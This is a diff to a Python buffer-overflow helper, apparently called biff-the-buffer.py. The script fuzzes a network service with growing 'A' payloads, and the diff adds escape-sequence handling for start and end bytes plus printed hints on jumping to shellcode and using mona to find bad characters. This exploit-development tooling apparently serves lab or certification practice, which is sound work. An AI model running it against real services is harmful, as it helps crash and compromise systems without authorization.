@@ -35,8 +35,11 @@ def main():
   timeout = args.timeout
 
   # Convert some of the args
-  start = str.encode(start)
-  end = str.encode(end)
+  start = sanitize_string(str.encode(start, 'utf-8'))
+  end = sanitize_string(str.encode(end, 'utf-8'))
+
+  print(f'[*] Start Value: {start}')
+  print(f'[*] End Value: {end}')
 
   # Helper functions
   def socket_send(payload, print_before="", print_after=""):
@@ -51,7 +54,13 @@ def main():
 
   def print_next_posssible_command():
     print('[*] Possible next command:')
-    script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start.decode("utf-8")}" -e "{end.decode("utf-8")}"'
+
+    try:
+      script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start.decode("utf-8")}" -e "{end.decode("utf-8")}"'
+    except:
+      print('[X] Tried encoding start and end, but failed due to unprintable chars being present')
+      print('[X] Printing byte string in their place instead, which will need to be modified')
+      script = f'    ./biff-the-buffer.py -i {ip} -p {port} -s "{start}" -e "{end}"'
 
     # Determine which action was used
     if (action == 'fuzz'):
@@ -74,7 +83,7 @@ def main():
 
     while True:
       num_bytes = 100 * inc
-      string = start + b"A" * num_bytes + end
+      string = start + (b"A" * num_bytes) + end
       current_length = (len(string) - len(start))
       try:
         socket_send(string, f"[*] Fuzzing with {current_length} bytes")
@@ -111,6 +120,9 @@ def main():
     except:
       print("[*] Check your debugger for a crash")
       print_next_posssible_command()
+      print("[*] If unable to find an easy location to place your shellcode, you may need to use the msf-nasm_shell to get OP codes:")
+      print("    # If EAX has enough bytes to fit shellcode, you can jump over any buffer start by providing an add and then a jmp EAX")
+      print("    msf-nasm_shell add eax,12")
       print("[*] If using mona, here are some valuable commands:")
       print("    !mona config -set workingfolder c:\mona")
       print('    !mona bytearray -b "\\x00"')
@@ -212,6 +224,14 @@ def get_all_bytes(include_null=False, excluded_bytes=b""):
     # If the excluded bytes does not have that byte, then add it
     if(excluded_bytes.find(byte_val) == -1):
       byte_string = byte_string + byte_val
+  return byte_string
+
+def sanitize_string(byte_string):
+  for i in range(0, 256):
+    byte_val_string = i.to_bytes(1, "big")
+    string_rep_of_byte = '\\x' + byte_val_string.hex()
+    escaped_byte_string = str.encode(string_rep_of_byte)
+    byte_string = byte_string.replace(escaped_byte_string, byte_val_string)
   return byte_string
 
 if __name__ == "__main__":
